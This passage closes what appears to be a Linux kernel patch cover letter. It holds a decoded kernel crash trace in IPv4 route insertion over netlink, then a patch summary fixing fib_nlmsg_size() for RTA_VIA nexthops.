   4:	48 8b 7d 08          	mov    0x8(%rbp),%rdi
   8:	48 83 c4 30          	add    $0x30,%rsp
   c:	89 da                	mov    %ebx,%edx
   e:	be 07 00 00 00       	mov    $0x7,%esi
  13:	5b                   	pop    %rbx
  14:	5d                   	pop    %rbp
  15:	41 5c                	pop    %r12
  17:	41 5d                	pop    %r13
  19:	41 5e                	pop    %r14
  1b:	41 5f                	pop    %r15
  1d:	e9 25 23 ee ff       	jmp    0xffffffffffee2347
  22:	bb 97 ff ff ff       	mov    $0xffffff97,%ebx
  27:	eb cc                	jmp    0xfffffffffffffff5
  29:	90                   	nop
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	90                   	nop
  2d:	eb b7                	jmp    0xffffffffffffffe6
  2f:	e8 33 64 26 00       	call   0x266467
  34:	0f 1f 00             	nopl   (%rax)
  37:	90                   	nop
  38:	90                   	nop
  39:	90                   	nop
  3a:	90                   	nop
  3b:	90                   	nop
  3c:	90                   	nop
  3d:	90                   	nop
  3e:	90                   	nop
  3f:	90                   	nop

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	90                   	nop
   3:	eb b7                	jmp    0xffffffffffffffbc
   5:	e8 33 64 26 00       	call   0x26643d
   a:	0f 1f 00             	nopl   (%rax)
   d:	90                   	nop
   e:	90                   	nop
   f:	90                   	nop
  10:	90                   	nop
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
[   16.578115] RSP: 0018:ffff97d00034b8a0 EFLAGS: 00010246
[   16.587613] RAX: 00000000ffffffa6 RBX: 00000000ffffffa6 RCX: ffff97d00034b7fb
[   16.607035] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff9523038c53c0
[   16.623502] RBP: ffff97d00034ba48 R08: 0000000000000001 R09: ffff95230cf03eb0
[   16.637471] R10: ffffffffaa44dde0 R11: fefefefefefefeff R12: 0000000000000018
[   16.651794] R13: 00000000006433c6 R14: 00000000000000fe R15: 0000000000000001
[   16.668462]  fib_table_insert (net/ipv4/fib_trie.c:1380 (discriminator 1))
[   16.676737]  ? msi_set_affinity (arch/x86/kernel/apic/msi.c:37 (discriminator 1))
[   16.685448]  ? arch_stack_walk (arch/x86/kernel/stacktrace.c:26)
[   16.694306]  ? inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
[   16.703497]  inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
[   16.711734]  ? __pfx_inet_rtm_newroute (net/ipv4/fib_frontend.c:909)
[   16.722588]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7076)
[   16.732146]  ? __alloc_skb (net/core/skbuff.c:715)
[   16.742064]  ? ___slab_alloc (mm/slub.c:1080 mm/slub.c:4524)
[   16.750338]  ? avc_has_perm (include/linux/rcupdate.h:873 security/selinux/avc.c:1165 security/selinux/avc.c:1195)
[   16.758062]  ? __pfx_rtnetlink_rcv_msg (net/core/rtnetlink.c:4441)
[   16.767369]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[   16.775953]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[   16.784842]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[   16.793403]  ____sys_sendmsg (net/socket.c:775 (discriminator 1) net/socket.c:790 (discriminator 1) net/socket.c:2684 (discriminator 1))
[   16.802407]  ___sys_sendmsg (net/socket.c:2738)
[   16.811522]  __sys_sendmsg (net/socket.c:2770)
[   16.819685]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[   16.827525]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   16.838428] RIP: 0033:0x7fb9dd64efa3
[   16.845687] Code: 64 89 02 48 c7 c0 ff ff ff ff eb b7 66 2e 0f 1f 84 00 00 00 00 00 90 64 8b 04 25 18 00 00 00 85 c0 75 14 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 55 c3 0f 1f 40 00 48 83 ec 28 89 54 24 1c 48
All code
========
   0:	64 89 02             	mov    %eax,%fs:(%rdx)
   3:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   a:	eb b7                	jmp    0xffffffffffffffc3
   c:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  13:	00 00 00 
  16:	90                   	nop
  17:	64 8b 04 25 18 00 00 	mov    %fs:0x18,%eax
  1e:	00 
  1f:	85 c0                	test   %eax,%eax
  21:	75 14                	jne    0x37
  23:	b8 2e 00 00 00       	mov    $0x2e,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 55                	ja     0x87
  32:	c3                   	ret
  33:	0f 1f 40 00          	nopl   0x0(%rax)
  37:	48 83 ec 28          	sub    $0x28,%rsp
  3b:	89 54 24 1c          	mov    %edx,0x1c(%rsp)
  3f:	48                   	rex.W

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 55                	ja     0x5d
   8:	c3                   	ret
   9:	0f 1f 40 00          	nopl   0x0(%rax)
   d:	48 83 ec 28          	sub    $0x28,%rsp
  11:	89 54 24 1c          	mov    %edx,0x1c(%rsp)
  15:	48                   	rex.W
[   16.885977] RSP: 002b:00007ffd326672f8 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   16.901413] RAX: ffffffffffffffda RBX: 00007ffd326673b0 RCX: 00007fb9dd64efa3
[   16.923341] RDX: 0000000000000000 RSI: 00007ffd32667330 RDI: 0000000000000003
[   16.941505] RBP: 0000000000000003 R08: 0000000000000008 R09: 0000000000000004
[   16.957758] R10: fffffffffffff61f R11: 0000000000000246 R12: 00005563c1d7c2a0
[   16.972912] R13: 00005563c1d7c2a0 R14: 00007ffd32669430 R15: 0000000000000003
[   16.988807]  </TASK>
[   16.994133] Kernel Offset: 0x27600000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)

-----END crash log-----

Best regards,
Zihan Xi


Zihan Xi (1):
  ipv4: Fix fib_nlmsg_size() for RTA_VIA nexthops

 net/ipv4/fib_semantics.c | 71 ++++++++++++++++++++++++++++++----------
 1 file changed, 53 insertions(+), 18 deletions(-)

-- 
2.43.0
